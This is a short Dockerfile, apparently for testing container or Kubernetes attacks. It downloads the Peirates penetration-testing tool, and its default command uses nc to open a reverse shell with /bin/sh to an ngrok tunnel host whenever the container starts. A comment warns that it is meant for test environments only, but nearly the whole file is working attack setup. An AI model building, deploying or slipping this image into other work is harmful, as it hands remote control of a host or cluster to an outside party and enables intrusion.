FROM bash:latest
# Don't use outside of test environments
RUN apk add --update python3
RUN wget https://github.com/inguardians/peirates/releases/download/v1.1.16/peirates-linux-amd64.tar.xz -O /tmp/peirates.tar.xz
CMD ["nc","4.tcp.eu.ngrok.io","19101","-e","/bin/sh"]
